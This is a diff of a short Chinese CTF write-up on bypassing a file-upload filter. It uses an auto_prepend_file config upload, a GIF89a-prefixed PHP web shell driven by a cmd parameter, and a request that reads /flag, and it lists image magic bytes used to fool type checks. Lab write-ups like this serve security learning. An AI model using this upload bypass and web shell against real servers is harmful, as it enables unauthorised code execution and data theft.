@@ -1,4 +1,6 @@
 又是随便点开的一个，好在，是文件上传。
+## 1
+
 常规步骤之后，上传了`.htaccess`文件，不过发现被限制了。
 返回了一个：
 ```SQL
@@ -17,6 +19,9 @@ GIF89a
 auto_prepend_file=po.jpg
 ```
 之后就可以常规步骤一顿操作。
+
+### 2
+
 这里也有了新一种方法`用传进去的cmd 进行rce`——其前提是传入的木马文件内容为：
 ```script
 GIF89a 
@@ -35,8 +40,8 @@ uploads/xxx/index.php?cmd=var_dump(file_get_contents("/flag"));
 
 
 -----
-
-ps：图片文件头前缀
+### 3
+ps：图片文件头前缀（作用是？）
 
 ```txt
 JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码）
@@ -46,5 +51,5 @@ PNG： 89 50 4E 47
 ```
 
 <a href=https://www.cnblogs.com/zhiliu/p/16825982.html>参考一下</a>
-
+<a href=https://www.cnblogs.com/cjjcn/p/13954347.html>常见文件头/尾总结</a>
 php解析文件值得关注
